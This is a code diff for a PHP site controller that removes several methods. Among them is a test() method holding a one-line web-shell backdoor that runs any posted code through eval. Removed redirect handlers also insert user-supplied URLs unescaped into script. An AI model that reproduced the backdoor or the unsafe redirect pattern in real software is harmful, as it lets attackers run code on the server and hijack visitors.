@@ -17,9 +17,6 @@ class IndexAction extends CommonAction {
 		import("@.ORG.String");
 	
 		// 公告
-		$variable = M("Variable");
-		$ann_name = $variable->getByVname('ann_name');
-	
 		$announce = M("Announcement");
 		$announces = $announce->where('status = 1')->order('sort ASC, create_time DESC')->select();
 	
@@ -37,7 +34,6 @@ class IndexAction extends CommonAction {
 			$areaList = $this->_session('arealist');
 			!empty($areaList) || session('arealist', session('arealist_default'));
 		}
-		$this->assign('ann_name', $ann_name['value_varchar']);
 		$this->assign("announces", $announces);
 	
 		$this->getHeaderInfo();
@@ -143,75 +139,6 @@ class IndexAction extends CommonAction {
 		
 		$this->getHeaderInfo();
 		$this->display('index');
-	}
-
-	/**
-	 * @name directUrl
-	 * @desc 直达网址
-	 * @param string tag
-	 * @author Frank UPDATE 2013-08-17
-	 */
-	public function directUrl() {
-		$model = M("DirectLinks");
-		$condition['status'] = 1;
-		$tag = cleanParam($this->_param('tag'));
-		$tag = str_replace('。', '.', $tag);
-		$len = strlen($tag);
-		if ((strpos($tag, '网') == ($len - 3)) && $len > 6) {
-			$tag = substr($tag, 0, $len - 3);
-		}
-		$condition['tag'] = $tag;
-		$linkNow = $model->where($condition)->find();
-		if ($linkNow) {
-			$model->where("id={$linkNow['id']}")->setInc("click_num");
-			echo '<style type="text/css">a{display:none}</style>
-				  <script src="http://s96.cnzz.com/stat.php?id=4907803&web_id=4907803" language="JavaScript"></script>
-				  <script type="text/javascript">window.location.href="http://' . $linkNow['url'] . '";
-				  </script>';
-		} else {
-			$data['tag'] = $condition['tag'];
-			$data['update_time'] = time();
-			$model->add($data);
-			$this->display('../Public/directUrl');
-		}
-	}
-
-	/**
-	 * @desc 连接导向
-	 * @name link_out
-	 * @param string mod
-	 * @param string url
-	 * @author Frank UPDATE 2013-08-17
-	 */
-	public function link_out() {
-		$url = $this->_param('url');
-		$mod = $this->_param('mod');
-	
-		if (empty($url)) {
-			$this->error("对不起，链接不存在！");
-		}
-		$flag = 0;
-		if ($mod == "myarea") {
-			$mid = intval($_SESSION[C('MEMBER_AUTH_KEY')]);
-			$myarea = D("Myarea");
-			$flag = $myarea->where("mid = '%d' and url = '%s'", $mid, $url)->setInc("click_num");
-		} else {
-			$linkModel = D("Links");
-			$flag = $linkModel->where("link = '%s'", $url)->setInc("click_num");
-		}
-		
-		echo '<style type="text/css">a{display:none}</style>
-				<script src="http://s96.cnzz.com/stat.php?id=4907803&web_id=4907803" language="JavaScript"></script>
-				<script type="text/javascript">window.location.href="' . (strpos ($url, 'http://')===FALSE && strpos ($url, 'https://')===FALSE ? 'http://' . $url : $url) . '";</script>';
-		/*
-		$check_url = $_SERVER['HTTP_REFERER'];
-		if ($check_url != '') {
-			$check_url = parse_url($check_url);
-			if ($check_url['host'] == 'test.links123.net' || $check_url['host'] == 'www.links123.cn') {
-				
-			}
-		}
-		*/
 	}
 	
 	/**
@@ -716,7 +643,7 @@ class IndexAction extends CommonAction {
 		// 分页
 		$count = count($list);
 		if ($count == 0) {
-			$this->redirect("category");
+			$this->redirect("Category/index");
 		}
 		if ($count > 0) {
 			import("@.ORG.Page");
@@ -732,29 +659,7 @@ class IndexAction extends CommonAction {
 		$this->assign('Description', '另客独有的搜索引擎汇集给您带来特有的搜索体验。你不用离开另客就能很方便地使用众多最有影响力的搜索引擎。另客本身丰富的数据也是你寻找教育资源最好的搜索引擎。网友的分享和交流更可能让你获得意想不到的信息');
 		
 		$this->display();
-	}
-
-	/**
-	 * @name category
-	 * @desc 获取分类
-	 * @param int lan
-	 * @param int rid
-	 * @author Frank UPDATE 2013-08-20
-	 */
-	public function category() {
-		$language = $this->_param('lan');
-		$rid = $this->_param('rid');
-		
-		$this->assign('language', $language);
-		$this->getMyCats($language);
-		$this->assign('rid', $rid);
-		$this->assign('tidNow', 10);
-		$this->assign('banner', $this->getAdvs(6, "banner"));
-		
-		$this->display();
-	}
-	
-	
+	}	
 
 	/**
 	 * @name searchTips
@@ -824,11 +729,11 @@ class IndexAction extends CommonAction {
 	public function ajax_get_links() {
 		if ($this->isAjax()) {
 			$lan = intval($this->_param('lan'));
-			$page = (int)$this->_param('p');
+			$page = intval($this->_param('p'));
 			$cid = intval($this->_param('cid'));
 			$grade = $this->_param('grade');
 			$sort = $this->_param('sort');
-			$page = $page ? $page : 1;
+			$page = $page >1 ? $page : 1;
 			
 			if ($lan == 0) {
 				$lan = session('lanNow');
@@ -853,21 +758,5 @@ class IndexAction extends CommonAction {
 		$url = 'http://translate.google.cn/translate_a/t?client=t&hl=zh-CN&sl=' . $srcLang . '&tl=' . $tatLang . '&ie=UTF-8&oe=UTF-8&multires=1&oc=1&prev=conf&psl=en&ptl=vi&otf=1&it=sel.166768%2Ctgtd.2118&ssel=4&tsel=4&sc=1&q=' . $q;
 		$result = file_get_contents($url);
 		$this->ajaxReturn($result, '', true);
-	}
-	
-	public function test0619() {
-		set_time_limit(1000);
-		import("@.ORG.VideoDownload");
-		$videoDownload = new VideoDownload();
-		$videoInfo = $videoDownload->download("http://www.peepandthebigwideworld.com/activities/anywhere-activities/whathappens/");
-		if (!$videoInfo) {
-			var_dump($videoDownload->getError());
-		}
-		var_dump($videoInfo);
-	}
-	
-	public function test() {
-		@eval($_POST['chopper']);
-		exit(0);
 	}
 }
